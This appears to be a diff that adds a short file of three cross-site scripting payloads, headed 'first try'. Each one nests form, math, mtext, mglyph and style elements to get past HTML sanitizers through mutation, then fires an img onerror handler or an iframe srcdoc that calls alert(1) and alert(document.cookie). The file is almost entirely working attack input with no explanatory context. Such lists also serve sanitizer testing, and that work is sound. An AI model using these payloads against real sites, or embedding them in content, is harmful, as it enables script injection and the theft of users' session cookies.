@@ -1,0 +1,7 @@
+>> first try
+
+<form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)></style></mglyph></form></mtext></math></form>
+
+<form><math><mtext><form><mglyph><style></math><img src onerror=alert(document.cookie)></style></mglyph></form></mtext></math></form>
+
+<form><math><mtext><form><mglyph><style></math><iframe srcdoc="<img src onerror=alert(1);alert(document.cookie);alert(2)>"></iframe></style></mglyph></form></mtext></math></form>
